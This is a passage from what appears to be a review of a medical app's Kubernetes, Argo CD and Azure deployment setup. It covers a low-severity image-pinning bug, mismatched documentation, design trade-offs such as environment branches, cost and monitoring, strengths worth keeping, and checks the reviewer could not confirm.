### 30. `up.sh --argocd --revision` leaves the image pinned on the Application

- **Severity:** low; local only. **Confidence:** medium-high, from how `kubectl apply` merges (not run).
- **Evidence:**
  - **The pin:** `deploy/kind/up.sh:134-139` adds the image tag as `spec.source.helm.parameters`, using `kubectl patch`. Those parameters override value files.
  - **It's never cleared:** a later plain `up.sh --argocd` runs `kubectl apply -f deploy/argocd/medapp-kind.yaml` (`:126`). That resets `targetRevision` but leaves fields it never applied itself, so the parameters stay.
- **Impact:** after a `--revision` session, kind silently stops following env/kind's image.
- **Fix:** in the path without `--revision`, remove `/spec/source/helm/parameters` with a JSON patch, or apply server-side with `--force-conflicts`.

### 31. Documentation and comments that don't match the code

- **Severity:** low. **Confidence:** high.
- **Covered by earlier findings:**

  | Where | Claim | See |
  |---|---|---|
  | `deploy/argocd/README.md:19`, `medapp-kind.yaml:7` | The rollback | Finding 2 |
  | `deploy/argocd/README.md:7` | "after CI … has passed" | Finding 7 |
  | `deploy/azure/README.md:88` | "brings any change into the cluster within an hour" | Finding 5 |
  | `deploy/azure/traefik-values.yaml:2` | Let's Encrypt's challenges are exempt | Finding 4 |
  | `deploy/azure/values.yaml:4` | "across the nodes" | Finding 22 |
  | `publish.yml:19,82` | "in order", "the same digest runs everywhere" | Findings 29 and 14 |
  | `ApplicationBuilderExtensions.cs:26`, PR #42 | `/ssr` and `/.vite` are never served | Finding 19 |
  | `SsrOptions.cs:21-22`, PR #42 | What happens when a render is too slow | Finding 3 |

- **Not covered elsewhere:**
  - `deploy/kind/traefik-values.yaml:2-4` says "There's no TLS locally", but kind serves https://localhost:8443.
  - `deploy/helm/medapp/README.md:87-89` still lists Argo CD and Azure under "Not yet".
  - `MedApp.Web/server/server.mjs:6,15` refers to `SsrHost`; the class is `SsrServer`.
  - `deploy/helm/medapp/templates/secret.yaml:12` says SQL Server's data volume "only opens with" its original password. In fact the volume opens; it's logins with a different password that fail, because `MSSQL_SA_PASSWORD` is only used when the server is first set up. The effect is the same, but the wording misleads.

---

## Judgement-level concerns

- **Environment branches built by merging.**
  - **Sound reasons:** `main` takes only pull requests, and Argo CD won't mix two revisions of one repository.
  - **The cost:** merging brings the revert trap (finding 2), and makes every environment branch a second copy of main's history.
  - **Alternatives:** any of these keeps "the history is the deploy log" without the trap:
    - a deploy commit that replaces the whole tree
    - a separate config repository (multi-source Applications can mix repositories)
    - Argo CD Image Updater writing to a values file that only the environment uses
- **No promotion between environments.**
  - **No gate:** one merge moves env/kind and env/azure in the same run, so kind never acts as a gate for production. With finding 7, "merged" means "in production".
  - **A cheap fix:** a manual promotion to env/azure by SHA, once kind is healthy, would make kind earn its place.
- **Node inside the API process.**
  - **The upside:** one image, and it works under the AppHost.
  - **The cost:** in Kubernetes the API becomes Node's supervisor, without restarts, health checks or memory isolation (findings 10, 12 and 23).
  - **An alternative:** a sidecar container in the same pod, on loopback, with its own probes and limits, gets restarts for free while the API's fallback stays as it is.
- **The app's safety rests on Traefik's defaults.** Only Traefik's path cleaning neutralises findings 1 and 19. Swapping the ingress would expose them: AKS's App Routing (NGINX), Application Gateway or Container Apps. Controls belong in the app.
- **Health checks on their own port.**
  - **Little to protect:** the endpoints return only Healthy or Unhealthy.
  - **The cost:** the separate port adds a second listener that also serves the whole app.
  - **Verdict:** worth keeping only if detailed health output is added later.
- **The EF migrations bundle in the API image.**
  - **The upside:** the schema always matches the app.
  - **The cost:** migrations and the app share one, admin, credential (finding 15).
  - **If you keep it:** give the Job a Secret with schema rights, and the API a user with data rights only.
- **Valkey, and skipping negotiation.**
  - **Right calls:** a backplane is needed for fan-out across copies whether or not sessions are sticky. WebSockets with `skipNegotiation` is Microsoft's documented way to avoid sticky sessions.
  - **The trade-off:** no fallback transport for networks that block WebSockets. That's acceptable, because stored notifications still show on the next load, but it should be written down.
- **SQL authentication on Azure.** It's a reasonable first step, but the order is backwards for a medical app. The least-privilege database user (finding 15) is cheap, and should come before the first real deploy, not after.
- **Scale and cost.**
  - **A lot of moving parts:** AKS, Argo CD, External Secrets, cert-manager, Traefik and Valkey, for one small app with one maintainer.
  - **The cost:** about £150 or more a month before SQL, for two D2s v5 nodes with their disks and the load balancer. The README leaves out the OS disks.
  - **Cheaper options:** Azure Container Apps (managed TLS, Key Vault references, revisions, scale to zero) or App Service would run this image for a fraction of the cost and effort.
  - **When AKS is justified:** if the goal is to learn Kubernetes, or to host more services later. Say so.
- **No monitoring.**
  - **What's missing:** there's no OTLP endpoint and no Container Insights.
  - **Why it matters:** the silent failures in this review would go unnoticed: SSR off, the backplane's password out of step, rotated passwords.
  - **When:** monitoring should come before production, not after.
- **MediatR's licence.**
  - **The warning:** the kind logs show MediatR 14's licence warning: "If you are running in production you are required to have a licensed version".
  - **What to do:** hosting on Azure is production use, so get a key (a free community one may apply) or replace MediatR.
- **Log volume.**
  - **What's logged:** EF Core logs every SQL command at Information in production; the kind logs show every query.
  - **The cost:** on Azure with Log Analytics, that's cost and noise.
  - **The fix:** set `Microsoft.EntityFrameworkCore.Database.Command` to Warning outside Development.

## Worth keeping

Keep these when making the fixes:

- **Server-side rendering:**
  - a new router and query cache for each request
  - the request context in AsyncLocalStorage
  - relative redirects
  - correct escaping: a hostile synthetic patient name rendered fully escaped
  - the `typeof window` guards
  - Node listening on loopback only, with a random key per process that does nothing more than skip the https redirect
  - `AllowAutoRedirect = false` and `UseCookies = false`
  - the idea of falling back to `index.html`
  - the end-to-end render tests in Node
- **`create-first-admin`:**
  - command line only, with no HTTP route and no anonymous sign-up, so there's no window to race
  - idempotent, in one transaction
  - never resets a password
  - a strong random default
- **The chart:**
  - the restricted Pod Security Standard, read-only roots, all capabilities dropped, no service account tokens, and seccomp
  - default-deny network policies with explicit egress
  - requests and memory limits with no CPU limits
  - `preStop`, and the PDB
  - the `fail` guards: more than one copy without a backplane, an external database without a secret, and a required image tag
  - `resource-policy: keep` on the database Secret
  - expand-then-contract written down
- **Argo CD:** the sync waves and the mapping of the hook, which are well reasoned and well documented.
- **The kind scripts:**
  - every command pinned to the context
  - safe to re-run
  - Helm and Argo CD kept from both deploying at once
  - image tags from the image ID
  - versions shared in `versions.sh`
  - LF line endings through `.gitattributes`
- **The Azure design:**
  - identity federation (OIDC) limited to main, with no stored cloud secret
  - registry and vault roles scoped to the resource
  - no admin user on the registry
  - Key Vault with RBAC and purge protection
  - SQL with public access off, a private endpoint and a private DNS zone
  - Cilium enforcing the policies
  - local accounts off
  - secure parameters, with nothing secret in the outputs
  - what-if before every deploy
  - honest "not deployed" labelling, and a cost section
- **The rest:**
  - the hand-written, tested mappers, and the fix that stopped returning the `Patient` entity
  - the fix to the exception middleware's content type, with its test
  - both test suites green: 708 .NET and 666 web

## What I couldn't verify

- **ARM what-if and secrets:** whether what-if prints the evaluated Key Vault secret values. The connection string includes the SQL password. Check on the first run, or move secret creation out of the template (finding 5).
- **AKS identity:** AKS with a system-assigned control-plane identity on your own subnet gets Network Contributor only after it's created. Microsoft recommends a user-assigned identity for ARM and Bicep in this case. It's probably fine here, because Traefik's load balancer is created minutes later, but a user-assigned identity removes the race.
- **Let's Encrypt and the redirect:** the HTTP-01 challenge through the http-to-https redirect will probably work (finding 4). Confirm on the first run.
- **Windows line endings:** the carriage return in `az` output under Git Bash (finding 17).
- **The first Azure deploy:**
  - **Before it:** Argo CD shows a comparison error until env/azure exists, and that needs another merge or a manual Publish run. The README says "from the next merge".
  - **kubeconfig:** `kubelogin convert-kubeconfig` (`bootstrap.sh:30`) rewrites every Azure context in your kubeconfig, not just this cluster's.
